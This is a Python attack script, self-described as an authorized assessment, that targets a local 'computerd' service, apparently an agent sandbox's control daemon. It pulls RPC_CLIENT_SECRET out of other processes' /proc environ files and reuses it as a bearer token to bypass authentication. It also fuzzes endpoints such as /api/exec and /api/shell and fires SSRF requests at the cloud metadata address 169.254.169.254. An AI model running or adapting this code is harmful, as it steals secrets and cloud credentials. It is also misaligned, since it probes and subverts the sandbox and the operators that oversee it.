#!/usr/bin/env python3
"""computerd :8080 API probe — authorized security assessment.
Enumerates endpoints, checks auth bypass, tests SSRF via /connect body.
"""
import subprocess, json, os, sys

LOG = "/mnt/data/output/computerd_probe.log"
os.makedirs(os.path.dirname(LOG), exist_ok=True)
lines = []

def log(msg):
    print(msg)
    lines.append(msg)

def run(cmd, timeout=10):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip(), r.stderr.strip(), r.returncode
    except subprocess.TimeoutExpired:
        return "", "TIMEOUT", -1

log("=" * 70)
log("  COMPUTERD :8080 — API Enumeration & Auth Bypass Probe")
log("  Authorized Security Assessment")
log("=" * 70)
log("")

# 1. Health endpoint
log("── 1. HEALTH ENDPOINT (no auth) ──")
for method in ["GET", "HEAD", "POST", "PUT", "DELETE", "OPTIONS"]:
    out, err, rc = run(f'curl -sf -o /dev/null -w "%{{http_code}}" -X {method} http://127.0.0.1:8080/health')
    log(f"  {method:8s} /health → {out}")
log("")

# 2. /api auth probe
log("── 2. /api AUTH PROBE ──")
out, _, _ = run('curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:8080/api')
log(f"  GET  /api (no auth)    → {out}")
out, _, _ = run('curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer test" http://127.0.0.1:8080/api')
log(f"  GET  /api (bad bearer) → {out}")
log("")

# 3. Secret recovery
log("── 3. RPC_CLIENT_SECRET RECOVERY ──")
secret = ""
for src in ["self", "1"]:
    out, err, _ = run(f"tr '\\0' '\\n' < /proc/{src}/environ 2>/dev/null | grep RPC_CLIENT_SECRET")
    if out and "=" in out:
        log(f"  /proc/{src}/environ: FOUND (redacted)")
        if not secret: secret = out.split("=", 1)[1]
    else:
        log(f"  /proc/{src}/environ: {err[:80] or 'NOT FOUND'}")
out, _, _ = run("pgrep -x computerd 2>/dev/null")
if out:
    cpid = out.strip().split()[0]
    out2, err2, _ = run(f"tr '\\0' '\\n' < /proc/{cpid}/environ 2>/dev/null | grep RPC_CLIENT_SECRET")
    if out2 and "=" in out2:
        log(f"  /proc/{cpid}/environ (computerd): FOUND (redacted)")
        if not secret: secret = out2.split("=", 1)[1]
    else:
        log(f"  /proc/{cpid}/environ (computerd): {err2[:80] or 'NOT FOUND'}")
log("")

# 4. Endpoint fuzzing
log("── 4. ENDPOINT FUZZING ──")
paths = ["/", "/api", "/ws", "/connect", "/health",
    "/api/v1", "/api/files", "/api/exec", "/api/shell",
    "/api/run", "/api/command", "/api/process",
    "/api/workspace", "/api/sync", "/api/upload", "/api/download",
    "/metrics", "/debug", "/debug/pprof", "/status", "/info",
    "/version", "/config", "/.well-known/"]
for path in paths:
    out, _, _ = run(f'curl -s -o /dev/null -w "%{{http_code}}" http://127.0.0.1:8080{path}')
    marker = " ◄ INTERESTING" if out not in ("404", "401", "") else ""
    log(f"  GET  {path:30s} → {out}{marker}")
log("")

# 5. /connect SSRF test
log("── 5. /connect SSRF & AUTH BYPASS ──")
out, _, _ = run('''curl -s -w "\\n%{http_code}" -X POST http://127.0.0.1:8080/connect \
  -H "Content-Type: application/json" \
  -d '{"base":"http://127.0.0.1:8000","health":"/health","api":"/api","healthTimeoutMs":2000}' ''')
parts = out.rsplit("\n", 1)
log(f"  POST /connect (no auth): code={parts[-1]} body={parts[0][:200] if len(parts)>1 else ''}")

if secret:
    log("  [!] Trying with recovered secret + IMDS SSRF target...")
    out, _, _ = run(f'''curl -s -w "\\n%{{http_code}}" -X POST http://127.0.0.1:8080/connect \
      -H "Content-Type: application/json" \
      -H "Authorization: Bearer {secret}" \
      -d '{{"base":"http://169.254.169.254","health":"/latest/meta-data/","api":"/","healthTimeoutMs":5000}}' ''')
    parts = out.rsplit("\n", 1)
    log(f"  POST /connect (IMDS SSRF): code={parts[-1]} body={parts[0][:300] if len(parts)>1 else ''}")
log("")

# 6. Response headers/body
log("── 6. RESPONSE INSPECTION ──")
for path in ["/health", "/api", "/connect"]:
    out, _, _ = run(f'curl -sD- http://127.0.0.1:8080{path} 2>/dev/null | head -15')
    log(f"  --- {path} ---")
    for line in (out or "").split("\n")[:8]:
        log(f"    {line}")
log("")

# 7. Listening ports
log("── 7. ALL LISTENING PORTS ──")
out, _, _ = run("ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null")
log(f"  {out}")
log("")

log("=" * 70)
log("  SUMMARY")
log("=" * 70)
log(f"  Secret recovered: {'YES — auth bypass possible' if secret else 'NO'}")
log("=" * 70)

with open(LOG, "w") as f:
    f.write("\n".join(lines) + "\n")
log(f"\nLog saved: {LOG}")
